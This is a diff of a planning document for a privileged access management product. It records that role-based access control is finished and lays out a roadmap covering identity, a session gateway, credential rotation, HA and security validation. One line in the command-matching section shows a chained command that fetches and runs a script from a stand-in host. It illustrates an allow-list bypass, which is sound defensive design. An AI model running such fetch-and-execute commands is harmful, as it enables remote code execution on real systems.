@@ -1,6 +1,6 @@
 # VY-PAM — Implementation Plan (remaining architecture coverage)
 
-**Status:** maintained through Phase 6a — remaining backlog starts at 6b
+**Status:** maintained through Phase 6b — remaining backlog starts at 6c
 **Authoritative spec:** `VY-PAM_Enterprise_PAM_Architecture.md`
 **Execution log:** `VY-PAM_MASTER_and_PAM_Workflow.md` (checkpoint rows — the
 resumable source of truth while working)
@@ -26,7 +26,7 @@ resumable source of truth while working)
 | §7 Risk-Based Access | 8-component engine + session gate | ✅ built | 4f |
 | §8 Privileged Sessions | recording, controls, cascade | ✅ built | 4c |
 | §9 Command Control | default-allow rules, holds, incidents | ✅ built | 4d |
-| §19 Immutable Audit | hash chain, 16 sources, verify/export | ✅ built | 4e |
+| §19 Immutable Audit | hash chain, 17 sources, verify/export | ✅ built | 4e |
 | §10 PAM Bypass Detection | direct-access detection | ✅ built | **4g** |
 | §17 Break Glass | emergency protocol (dual approval → recorded session → rotation) | ✅ built | **4h** |
 | §20 Enterprise Integrations | TOTP MFA gate, ITSM verify, SIEM push, LDAP bind | ✅ built | **4i** |
@@ -37,8 +37,16 @@ resumable source of truth while working)
 | §15 DevSecOps PAM | CI/CD JIT credential broker | ✅ built | **5c** |
 | §16 AI-Agent PAM | agent identity + task-scoped access | ✅ built | **5d** |
 | §18 HA / DC / DR | multi-node, replication, failover | ✅ built | **6a** |
-| RBAC / ABAC | multi-role model (single admin today) | ⛔ pending | **6b** |
+| RBAC / ABAC | multi-role model (single admin today) | ✅ built | 6b |
 | SSO / HSM enforcement | settings schema → real enforcement | ⛔ pending (schema only) | **6c** |
+| Real identity & login security | users, server-side sessions, MFA at login, actor bound to the authenticated user | ⛔ pending | **7** |
+| §27 Session Gateway | the data plane: protocol proxy, credential injection, recording | ⛔ pending | **8** |
+| §5 target-side rotation | push the rotated secret to the target (connector framework) | ⛔ pending | **9** |
+| Data layer & HA at scale | PostgreSQL + migrations, UTC, measured RPO/RTO | ⛔ pending | **10** |
+| Secure-by-default install | refuses insecure start, setup wizard, vendored assets, key ceremony | ⛔ pending | **11** |
+| Policy change control | maker-checker for critical changes, signed policy versions | ⛔ pending | **12** |
+| Security validation & scale proof | scanners, threat model, pentest, anchored chain, load numbers | ⛔ pending | **13** |
+| Competitive parity | notifications, packaging, reporting, multi-tenancy, UI modernization | ⛔ pending | **14** |
 | §21 Admin Dashboard | all widgets live | 🟡 partial | closes per phase |
 
 ## 2. How every phase executes (the 13-step loop)
@@ -460,16 +468,289 @@ peer asserting verbatim failures); runbooks in
 `docs/DEPLOYMENT_RUNBOOK.md` §7. `test_cluster.py` **36** + full backend
 **577** (in-container **495**).
 
-### 6b — RBAC / ABAC
-Multi-role model (today: single admin token + open dev mode): roles
-(admin / approver / operator / auditor / auditor-read-only), policy bindings
-on the 101 admin operations, attribute rules on vault items and targets.
-Contract lockstep: security schemes gain role requirements.
+### 6b — RBAC / ABAC ✅ (closed 2026-10-11)
+Honest multi-role authorization over the admin operations, policy in
+code with a single source (`service.ADMIN_OPERATIONS` **101→105**,
+`ROLE_OPERATIONS` derived: admin 105 / operator 45 / auditor 19 /
+auditor-read-only 16 / approver 10; approver∩operator = ∅; reveal
+operator-only; the 3 export GETs auditor-only). Tables **44→47**
+(`roles` seeded with the five built-ins, `role_bindings`, `rbac_events`).
+Enforcement funnels every admin route through
+`_require_admin_credential` (decorator + inline; op key normalizes
+Flask `<int:x>` → OpenAPI `{x}`); `admin-token` (kind admin) keeps the
+X-Actor convention while a bound principal overrides X-Actor as the
+audit actor (`_actor`). API tokens `vypam-rbac1.<id>.<secret>` are
+sha256 at rest, shown once, `last_used_at` recorded on verify, revoke →
+401 immediately. LDAP closes its hole: a valid directory ticket alone
+reaches no admin route — unbound principal → 403 verbatim, kind=ldap
+binding grants (migration note in `docs/DEPLOYMENT_RUNBOOK.md` §12).
+ABAC scope `{"targets": [fnmatch], "vault_items": [ids]}` is strictly
+validated (unknown keys rejected) and enforced on vault checkout /
+reveal / rotate / revoke + session create target (empty = unrestricted;
+out-of-scope → 403 with `details.target`). Open dev mode waives RBAC
+honestly (`/auth/whoami` reports `mode: open`). Contract lockstep: +2
+security schemes (`rbacToken`, `ldapTicket`), role scope lists on the
+74 admin ops that declare them (31 admin-only get `none`), +4 paths
+(`/roles`, `/role-bindings`, `/role-bindings/{binding_id}`,
+`/auth/whoami`) → **135 paths / 164 ops / 20 tags / 105 admin / 245
+schemas**. Ledger source `rbac` (**16→17**, 17th mapper `_map_rbac`),
+Compliance chips **17→18**. Platform Settings gains the RBAC / ABAC
+section (role directory, bindings table, grant form, one-time token
+box) with the gate at **50** checks — section UI checks plus a live
+grant → 403 verbatim → allowed op → scope 403 → revoke → 401 flow in
+token mode (`GATE_ADMIN_TOKEN`), self-noting open mode otherwise;
+proven green on rig A (open) and container rig B (token) alike.
+`test_rbac.py` **31**, contract tests **9**; full backend **613**
+(531 phase2 + 82 licensing; in-container **531**).
 
 ### 6c — SSO + HSM enforcement
 Settings schema (`sso`, `hsm`) becomes enforcement: SAML/OIDC login path and
 HSM/KMS-backed key operations (PKCS#11 or cloud KMS), replacing file-based
 keys where configured. Posture widget then counts them honestly as active.
+
+### Program beyond the architecture baseline (added at the 6b boundary)
+
+The phases below extend the plan beyond the architecture doc's original
+§1–§21 scope. They come from the honest gap analysis kept as repo-root
+working papers (`VY-PAM_Gap_Analysis_and_Roadmap.md` — the 460-line
+version with Addenda A/B/C is authoritative; the extension-less copy is a
+superseded draft — plus its companions `VY-PAM — Session Recording
+Storage Strategy.md` and `VY-PAM — Further Improvements Beyond the
+Blockers.md`). The working papers' verdict, quoted: VY-PAM today is *a
+very good control plane and audit layer without the data plane and
+without the enterprise plumbing*. The phases below close exactly that,
+in the analyst's dependency order, keeping every standing rule (contract
+lockstep, additive schema, honesty invariant, no fabricated counts —
+future counts stay `—`). Effort figures quoted from the papers are the
+analyst's rough estimates for one strong developer, **not commitments**.
+Severity and status notes reflect the papers' gap register (G1–G23);
+two register rows are already stale in our favour — G2 (HA/DR) shipped
+in 6a at single-binary scope and G4 (roles) shipped in 6b — the
+remaining aspects of each are named inside the matching phase below.
+
+### 7 — Real identity & login security (gap register G3 remainder, G21, G23's MFA half; Addendum C)
+Everything the gateway, SoD and change control will need: *who is the
+user*.
+- `users` table + local login (argon2id-class password hashing) +
+  server-side sessions (Secure/HttpOnly/SameSite, CSRF, idle + absolute
+  timeouts, revocation, "log out everywhere") — replacing stateless-only
+  trust; API tokens stay for machines.
+- Account lockout, per-account/per-IP rate limits, progressive delay,
+  spray-detection alerts; password policy per NIST (length over
+  complexity, breached-password check).
+- `mfa_required` policy flag, **fail-closed**: no enrolled factor ⇒
+  forced enrolment at first login, never a silent pass (fixes the
+  documented fail-open hole); MFA at login plus step-up for reveal /
+  critical approval / break-glass / high-critical JIT; TOTP replay
+  protection (reject reused time steps); hashed single-use backup codes.
+- Email OTP (CSPRNG code, HMAC-hashed, ~5 min TTL, single use, bound to
+  the challenge id, attempt caps + resend cooldown, no user
+  enumeration, never logged — ledger records `otp-sent/verified/failed/
+  locked` only) over a new sealed `smtp` settings group with a
+  test-send; SMS optional and provider-checked (DLT rules for India).
+- **Actor bound to the authenticated user**: client `X-Actor` ignored
+  for human sessions — what makes requester ≠ approver and dual
+  approval real controls instead of header conventions.
+- Dedicated offline emergency local admin (sealed, dual-approved to
+  open, alerted on use) for SSO outages; WebAuthn/FIDO2, RADIUS/push
+  and SCIM/lifecycle sync follow within the phase.
+- Ledger source `auth` (**17→18**), contract + UI + gate lockstep as
+  every phase. *Depends on 6c (SAML/OIDC lands there first).*
+
+### 8 — Session gateway & recording (§27; gaps G1, G9, G11, G12, G20; Addendum A + the recording storage paper)
+The data plane — the thing that actually sits between user and target.
+- Build order per the papers: **reuse `guacd`** (Apache-2.0; RDP/SSH/
+  VNC + native recording) behind our policy/JIT/vault first; then a Go
+  SSH gateway for first-class inline command interception (PTY
+  shadowing, line-buffer parsing, block/approve/allow inline,
+  terminate-on-match, asciicast-style recording); then a PostgreSQL/
+  MySQL wire-protocol proxy with query logging (MSSQL/Oracle via
+  jump/RDP initially).
+- **Credential injection**: the user never sees the password — the
+  gateway fetches it from the vault for the session only; closing the
+  loop means documenting + testing that targets only accept admin
+  logins from gateway IPs, which gives §10 bypass detection real teeth.
+- Control channel: live view, pause, terminate; the watermark overlay
+  finally stops saying `not connected`.
+- **Recording, by the storage paper**: text streams for SSH/DB (tens of
+  KB–few MB/h), screen recording only for RDP/VNC (20–150 MB/h) with
+  change-only capture, idle drop, 5–10 fps, 1280×720, H.264/H.265
+  transcoded in a background worker — compress **before** encrypting;
+  1–5 min segments streamed to hot/warm/cold tiers (SSD/MinIO →
+  S3-compatible → Glacier-class with Object Lock), never in the
+  database (pointer + size + **per-segment SHA-256 in the ledger**);
+  envelope encryption per recording (crypto-shreddable), retention by
+  asset tier/protocol/incident-hold with `retention-expired` ledger
+  events, spool-and-alert gateway behaviour with the block-vs-flag
+  failure mode as policy; capacity formula published once measured.
+- **Zones (Addendum A)**: `zones` / `gateway_nodes` / `gateway_pools` /
+  asset→zone mapping / heartbeat + capacity tables from day one;
+  session start picks a healthy gateway in the target's zone or fails
+  clearly; registering a gateway is a critical (two-approver) change;
+  relays are outbound-only mTLS, hold no secrets; ledger source
+  `gateway`.
+- File transfer (SFTP / RDP drive) through the gateway with allow/deny
+  + AV/DLP hook; playback UI with timeline; command search + OCR land
+  in phase 14 (B3).
+- Done when the papers' rehearsal line holds: *an approved JIT grant
+  opens an RDP and an SSH session from the browser, the password is
+  never seen, a blocked command stops inline, the session plays back,
+  and the password rotates on close.*
+
+### 9 — Target-side rotation & connector framework (gaps G5, G10, G19)
+Today's rotation changes only the vault copy — until this lands, "rotate
+on session end" must not be demoed on a real server (the next login
+would fail; the papers are explicit).
+- Plug-in interface: `verify(target, cred)` / `change(target, old, new)`
+  / `reconcile(target)`; versioned plug-ins declaring supported
+  platform versions; algorithm verify-old → change → verify-new →
+  commit to vault, roll back + incident on failure; scheduled verify +
+  reconcile jobs detect out-of-band password changes.
+- Ship order: Linux (SSH) → Windows local (WinRM/SMB) → AD accounts
+  (LDAP) → PostgreSQL/MySQL/MSSQL/Oracle → network devices → cloud IAM
+  keys; service-account dependency handling (Windows services, tasks,
+  app pools) with a list + restart hook.
+- **Throwaway Docker targets in CI** (one container per platform); a
+  *Supported Platforms* matrix **generated from the tests** so the
+  product never claims more than it proves.
+- Discovery upgrade in the same phase: AD/LDAP enumeration, WinRM/SSH
+  local- and service-account enumeration, larger rate-limited ranges,
+  scheduled scans, auto-onboard rules.
+
+### 10 — Data layer & HA at scale (gap remainder of G2 beyond 6a's single-binary scope, G8)
+- PostgreSQL via SQLAlchemy + **Alembic** (replacing the ad-hoc
+  `ensure_schema` for new environments; additive-only rule kept);
+  every timestamp moves to UTC `timestamptz` (the naive-local-time
+  limitation will bite across DC/DR otherwise).
+- Append-only on Postgres: `REVOKE UPDATE, DELETE` for the app role
+  plus a raising trigger; ledger `seq` assigned under an advisory lock
+  (or single writer function) so two app nodes cannot fork the chain.
+- Stateless app tier (N nodes behind LB; sessions in DB/Redis), DB tier
+  with Patroni or Pgpool-II streaming replication and a synchronous
+  replica for ledger/vault; vault keys become envelope-encrypted under
+  KMS/HSM (6c) — never one file on disk.
+- Audit export + recordings to immutable storage (S3 Object Lock /
+  MinIO WORM); **scripted DR drill with measured RPO and RTO, written
+  runbook, repeated** — no HA claim until a drill is recorded (our own
+  honesty rule).
+
+### 11 — Secure-by-default install & key custody (gap G6; HSM/KMS itself stays in 6c)
+- **Refuse to start without admin auth** unless `--insecure-dev` is
+  passed explicitly (the current "open dev mode" becomes a labelled
+  flag, not a default).
+- First-run setup wizard/CLI (`vypam init`): first admin, key
+  generation, TLS config, printed checklist; built-in TLS option +
+  shipped Nginx/Caddy templates; mTLS app ↔ gateway ↔ DB; security
+  headers, rate limiting.
+- **Vendor all front-end assets** (Tailwind build, fonts, icons) —
+  air-gapped buyers fail us otherwise; secrets hygiene (no secrets in
+  env dumps/logs, dependency pinning).
+- Shamir split for the vault key (e.g. 3-of-5 unseal ceremony) so no
+  single person or file holds the master key; answer to "what happens
+  when the vault key is lost?" must never be "secrets are gone".
+
+### 12 — Policy change control & command-matching hardening (Addendum B; gap G23 remainder, A3.9)
+- **Maker-checker for policy**: change-request object (draft →
+  submitted → approved/rejected → applied → rolled back) holding the
+  before/after diff, reason, ITSM ticket, requester, approvers;
+  approvers sign a **hash of the exact diff** and apply re-checks it;
+  author ≠ approver ≠ applier, super-admin cannot bypass, requests
+  expire; tiers — critical (two approvers + MFA step-up: block rules,
+  risk thresholds, auto-approve policies, break-glass/MFA/SSO/HSM/
+  WORM settings, roles/RBAC, widened allow-lists/scopes, new gateways,
+  licence changes), medium (one approver), low (direct, logged);
+  tightening is fast, loosening is strict; emergency path reuses
+  break-glass; time-boxed exceptions auto-revert.
+- Versioned, signed policy sets with one active pointer that moves only
+  via approved change; instant recorded rollback; what-if replay of the
+  last 30 days of evaluations before approval; drift detection at boot
+  + periodically (running-policy hash vs last approved version; direct
+  DB edits alert and hit the ledger); enforcement mode becomes
+  mandatory at go-live. Tables `policy_versions`, `change_requests`,
+  `change_approvals`, `change_events` → ledger source `policy-change`;
+  CI rule fails any mutating endpoint on a governed object that
+  bypasses the workflow (extends the lockstep rule).
+- **Command matching hardens now, not later** (quick win 3): anchored,
+  tokenised matching replacing `contains` (today
+  `systemctl restart postgresql; curl evil.sh | sh` would pass an
+  allow-listed substring), `default-deny` profiles, per-role rule sets,
+  evasion tests (whitespace, aliases, escapes, encodings, shell
+  substitution) — for §9 rules and the §16 agent allow-list alike.
+  *Depends on 7 (approvals need real users).*
+
+### 13 — Independent security validation & scale proof (gaps G7, G8, G22; A6 + A7)
+- CI: Bandit, Semgrep, `pip-audit`, Trivy, secret scanning, SBOM
+  (CycloneDX), signed release artifacts; written STRIDE threat model
+  for vault, gateway, ledger, licensing with abuse cases turned into
+  tests; third-party penetration test (CERT-In empanelled auditor for
+  India), executive summary published; "SOC 2-oriented" wording stays
+  until an auditor says otherwise.
+- **Anchor the chain outside the database** (closes the documented
+  hole that a DB-write attacker can drop triggers and recompute a
+  chain that still verifies): sign checkpoints with a key not stored
+  with the DB (KMS/HSM), push to WORM/SIEM/RFC-3161, and make
+  `/audit/verify` check the signatures.
+- Scale proof: k6/Locust load tests (vault ops, JIT approvals,
+  concurrent sessions, ledger append), 24–72 h soak with the rotation
+  scheduler, coverage measurement + perf budget in CI, published
+  sizing guide.
+
+### 14 — Competitive parity & modernization (Phase B of the papers + the improvements list)
+Priority driven by pilot feedback; each item is its own mini-phase with
+the same lockstep: notifications (SMTP/SMS/Slack/Teams, syslog/CEF,
+SNMP, SOAR webhooks, ServiceNow/Jira two-way) incl. **approvals from
+Slack/Teams/email**; real system-health screen + Prometheus `/metrics`
++ Grafana; `vypam backup`/`restore` commands (with `vault.key` handling
++ audit verify); SDKs + Postman from the OpenAPI; **ephemeral
+credentials** (SSH certificates from our own CA, short-lived DB users,
+cloud STS — the papers' suggested headline feature); access reviews /
+recertification campaigns; session search & playback (OpenSearch or
+Postgres FTS first, OCR frames, timeline player — depends on 8);
+certificate & SSH-key lifecycle management; India compliance packs
+(RBI/SEBI/CERT-In/DPDP/ISO 27001/PCI-DSS, honest "supports" wording,
+one-click PDF from ledger data); privilege elevation (sudo/runas
+brokering); packaging (.deb/.rpm/MSI, Helm, upgrade + rollback,
+Grafana dashboards); automation surface (Terraform provider, Ansible
+collection, CLI); scheduled reporting + MSP multi-tenancy (Postgres
+row-level security); UI (vendored assets, dark mode, i18n incl.
+Hindi, WCAG audit, component-framework migration + SSE/WebSocket once
+the gateway lands); Security Copilot (read-only natural-language over
+an allow-listed ledger view, local-model option for air-gapped);
+session summaries (needs 8); UEBA explainability + false-positive
+feedback + peer-group baselines; risk engine per-customer weights +
+offline geo-IP/ASN; engineering quality: split `service.py` into
+packages, background workers (RQ/Celery — the in-process scheduler
+will not survive HA), property/fuzz/chaos/mutation tests, ADRs, API
+hardening (rate limits, idempotency keys, scoped tokens, webhooks,
+deprecation policy); one naming decision to make honestly (the UI brand
+says "AegisPAM", the product says "VY-PAM" — pick one, check
+trademarks); and the §22 feature-matrix honesty pass so no ✅
+contradicts the built reality before any customer sees it.
+
+### Programme checklists (from the papers — the bar before a CyberArk/Iraje PoC)
+
+**PoC-ready (all unchecked until proven):**
+- [ ] Multiple users log in via AD/LDAP or SAML/OIDC with MFA; roles enforced everywhere
+- [ ] Safes/folders with membership and delegated administration (object scoping beyond 6b's target/vault-item ABAC)
+- [ ] RDP + SSH (+ PostgreSQL/MySQL) sessions through the gateway with credential injection
+- [ ] Live view, terminate, recording, playback, watermark overlay
+- [ ] Inline command blocking/approval at the gateway
+- [ ] Password rotation proven on Linux, Windows, AD and ≥2 databases; verify + reconcile jobs
+- [ ] PostgreSQL HA, scripted DR drill with measured RPO/RTO
+- [ ] Refuses insecure start; TLS + KMS/HSM option; assets vendored; offline-capable
+- [ ] Pentest done, high/critical findings closed; SBOM + signed builds
+- [ ] Load-test numbers and sizing guide published
+- [ ] Docs agree with code; Supported Platforms matrix generated from tests
+- [ ] Linux and Windows installers; upgrade/rollback tested
+
+**Buyer rehearsal (the ten questions to have answers for):** three
+admins with different visibility · bulk-onboard 50 servers · "connect to
+the prod DB, I never see the password" · "stop this dangerous command" ·
+"show me the recording, find the command I typed" · "I changed the
+password on the server — did PAM notice?" · "pull the plug on the
+primary" · "pentest report, sizing guide, compliance mapping" · "AD,
+SIEM and ServiceNow integration" · "what happens when the vault key is
+lost?".
 
 ---
 
@@ -478,11 +759,20 @@ keys where configured. Posture widget then counts them honestly as active.
 ```
 4k §12 ✓ (Phase 4 complete)
         → 5a §13 ✓ → 5b §14 ✓ → 5c §15 ✓ → 5d §16 ✓   (expansion)
-        → 6a §18 ✓ → 6b RBAC → 6c SSO/HSM          (scale)
+        → 6a §18 ✓ → 6b RBAC ✓ → 6c SSO/HSM            (scale)
+        → 7 identity → 8 gateway → 9 rotation connectors
+        → 10 data/HA → 11 secure-by-default → 12 change control
+        → 13 validation & scale → 14 parity             (PoC-ready program)
 ```
 
-- **4i next:** UEBA step-up responses and vendor flows both consume MFA/
-  ITSM/SIEM primitives; integrations are the multiplier.
+- **Order rationale (the papers' dependency logic):** identity (7)
+  precedes everything that must answer *who* — gateway sessions, SoD,
+  change control; the gateway (8) precedes recording-dependent features
+  (search/playback, summaries) and gives bypass detection real teeth;
+  target-side rotation (9) can proceed in parallel with 8 once 7 lands;
+  Postgres/HA (10) after the schema stops moving quickly; validation
+  (13) starts its CI-scanning half early and its pentest half once 8–10
+  exist to test.
 - Dashboard (§21) and docs close **inside each phase** — never a separate
   afterthought (lockstep rule).
 
@@ -491,18 +781,20 @@ keys where configured. Posture widget then counts them honestly as active.
 The end state, measured against the architecture doc — **all values will be
 real numbers collected at that time, `—` until then**:
 
-1. **Every architecture section §1–§21 has a built, tested implementation**
-   (the §1 status table above fully ✅), and §22 Feature Matrix rows match
-   reality line-for-line.
+1. **Every architecture section §1–§21 plus the §27 gateway has a built,
+   tested implementation** (the §1 status table above fully ✅ — which
+   now includes the post-6b program phases 7–14), the §22 Feature Matrix
+   rows match reality line-for-line (honesty pass lands in phase 14),
+   and the PoC-ready checklist at the end of §9 is fully checked.
 2. **Console:** all 11 sidebar screens live (including Break-Glass), zero
    `data-kind="static"` surfaces, zero FORBIDDEN strings, `file://` fallback
    intact.
-3. **Evidence:** one append-only ledger covering every module source (16
+3. **Evidence:** one append-only ledger covering every module source (17
    sources), chain verified in CI, NDJSON + webhook export flowing to a real
    SIEM when configured.
-4. **Contracts:** `apis/openapi.yaml` (path count `-`, today 131) and the
+4. **Contracts:** `apis/openapi.yaml` (path count `-`, today 135) and the
    vendor tool contract both enforced both-ways; zero dark endpoints.
-5. **Quality gates:** backend suite (today **577**) grows per phase with real
+5. **Quality gates:** backend suite (today **613**) grows per phase with real
    counts recorded in the READMEs; pam_master stays green (**46**); smoke,
    both UI verifiers, leak check all green at every boundary.
 6. **Operations:** single-node install stays Docker-free; §18 adds replicated
